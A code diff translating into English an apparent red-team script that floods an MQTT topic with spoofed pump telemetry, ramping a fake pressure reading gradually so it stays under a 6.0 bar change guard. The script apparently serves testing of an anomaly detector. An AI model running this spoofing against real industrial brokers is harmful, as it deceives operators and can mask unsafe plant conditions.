@@ -12,19 +12,19 @@ if str(_REPO_ROOT) not in sys.path:
 from common.mqtt_config import ProjectConfig, create_mqtt_client
 
 
-def get_spoofed_payload(passo_attacco: int):
+def get_spoofed_payload(attack_step: int):
     """Generate a physically impossible thermodynamic telemetry record that remains syntactically valid."""
     timestamp_str = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
     # Gradual pressure ramp designed to stay below the 6.0 bar instantaneous delta guard
-    pressione_inganno = min(6.0 + (passo_attacco * 2.5), 11.5)
+    spoofed_pressure = min(6.0 + (attack_step * 2.5), 11.5)
 
-    payload_strutturato = {
+    structured_payload = {
         "timestamp": timestamp_str,
         "sensori": {
             # --- SPOOFED / PHYSICALLY INCONSISTENT VALUES ---
             "S1_Pompa_RPM": 2900.0,
             "S2_Corrente_A": 2.5,
-            "S4_Pres_Mandata_bar": round(pressione_inganno, 2),
+            "S4_Pres_Mandata_bar": round(spoofed_pressure, 2),
             "S9_Temp_Motore_C": 74.0,
             # --- PLAUSIBLE / BENIGN VALUES ---
             "S3_Pres_Aspirazione_bar": 1.5,
@@ -35,14 +35,14 @@ def get_spoofed_payload(passo_attacco: int):
             "S10_Efficienza_Pct": 88.0,
         },
     }
-    return json.dumps(payload_strutturato), pressione_inganno
+    return json.dumps(structured_payload), spoofed_pressure
 
 
 def on_connect(client, userdata, flags, rc):
     if rc == 0:
-        print("🔴 Red Team: Connesso! Avvio spoofing semantico multivariato...")
+        print("[RED TEAM] Connected! Starting multivariate semantic spoofing...")
     else:
-        print(f"Errore connessione: {rc}")
+        print(f"[ERROR] MQTT connection failed (rc={rc})")
 
 
 def main():
@@ -54,31 +54,31 @@ def main():
     parser.add_argument("--interval", type=float, default=5.0)
     args = parser.parse_args()
 
-    client = create_mqtt_client(client_id="RedTeam_Semantic_Spoofer")
+    client = create_mqtt_client(client_id="RedTeam_Semantic_Spoofer", cfg=cfg)
     client.on_connect = on_connect
 
-    print(f"Connessione a {args.broker}...")
+    print(f"Connecting to {args.broker}...")
     client.connect(args.broker, args.port, 60)
     client.loop_start()
 
     try:
-        print("🔥 LANCIATO ATTACCO DI SPOOFING SEMANTICO 🔥")
+        print("[ATTACK] SEMANTIC SPOOFING CAMPAIGN STARTED")
         time.sleep(2)
 
         counter = 0
         while True:
-            payload_str, pres_corrente = get_spoofed_payload(counter)
+            payload_str, current_pressure = get_spoofed_payload(counter)
             client.publish(args.topic, payload_str, qos=0)
             counter += 1
 
             print(
-                f"[+] Invio Spoof #{counter} -> "
-                f"[RPM: 2900.0 | Corrente: 2.5A | Pressione: {pres_corrente} Bar | Temp: 74.0°C]"
+                f"[+] Sent Spoof #{counter} -> "
+                f"[RPM: 2900.0 | Current: 2.5A | Pressure: {current_pressure} bar | Temp: 74.0 C]"
             )
             time.sleep(args.interval)
 
     except KeyboardInterrupt:
-        print("\n🛑 Attacco semantico interrotto dal Red Team.")
+        print("\n[STOP] Semantic spoofing stopped by Red Team.")
     finally:
         client.loop_stop()
         client.disconnect()
